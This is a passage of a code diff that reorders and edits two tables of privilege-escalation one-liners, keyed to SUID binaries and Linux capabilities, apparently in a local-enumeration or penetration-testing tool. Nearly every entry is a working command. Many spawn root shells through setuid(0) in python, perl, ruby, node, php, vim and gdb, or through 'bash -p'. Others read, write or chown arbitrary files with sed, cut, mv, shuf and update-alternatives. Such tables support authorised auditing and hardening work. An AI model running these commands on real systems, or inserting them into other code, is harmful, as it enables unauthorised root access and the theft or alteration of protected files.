-        "./unzip -K shell.zip\n./sh -p\n"
-    ],
-    "shuf": [
-        "LFILE=file_to_write\n./shuf -e DATA -o \"$LFILE\"\n"
-    ],
-    "sed": [
-        "LFILE=file_to_read\n./sed -e '' \"$LFILE\"\n"
-    ],
-    "yash": [
-        "./yash"
-    ],
-    "soelim": [
-        "LFILE=file_to_read\n./soelim \"$LFILE\"\n"
-    ],
-    "look": [
-        "LFILE=file_to_read\n./look '' \"$LFILE\"\n"
-    ],
-    "choom": [
-        "./choom -n 0 -- /bin/sh -p"
-    ],
-    "bash": [
-        "./bash -p"
-    ],
-    "chown": [
-        "LFILE=file_to_change\n./chown $(id -un):$(id -gn) $LFILE\n"
-    ],
-    "unshare": [
-        "./unshare -r /bin/sh"
-    ],
-    "readelf": [
-        "LFILE=file_to_read\n./readelf -a @$LFILE\n"
-    ],
-    "cut": [
-        "LFILE=file_to_read\n./cut -d \"\" -f1 \"$LFILE\"\n"
-    ],
-    "mv": [
-        "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./mv $TF $LFILE\n"
-    ],
-    "bzip2": [
-        "LFILE=file_to_read\n./bzip2 -c $LFILE | bzip2 -d\n"
-    ],
-    "ssh-keygen": [
-        "./ssh-keygen -D ./lib.so"
-    ],
-    "basez": [
-        "LFILE=file_to_read\n./basez \"$LFILE\" | basez --decode\n"
+    "update-alternatives": [
+        "LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\n./update-alternatives --force --install \"$LFILE\" x \"$TF\" 0\n"
     ]
 }
 # SUID_BINS_END
@@ -1815,32 +1812,32 @@ capabilities={
     "gdb": [
         "./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit"
     ],
-    "vim": [
-        "./vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
-    ],
-    "python": [
-        "./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
-    ],
-    "view": [
-        "./view -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
-    ],
     "rview": [
         "./rview -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
     ],
-    "rvim": [
-        "./rvim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
-    ],
-    "node": [
-        "./node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'\n"
+    "vim": [
+        "./vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
     ],
     "php": [
         "CMD=\"/bin/sh\"\n./php -r \"posix_setuid(0); system('$CMD');\"\n"
     ],
+    "perl": [
+        "./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"
+    ],
     "ruby": [
         "./ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"
     ],
-    "perl": [
-        "./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"
+    "node": [
+        "./node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'\n"
+    ],
+    "python": [
+        "./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
+    ],
+    "rvim": [
+        "./rvim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
+    ],
+    "view": [
+        "./view -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
     ]
 }
 # CAPABILITIES_END
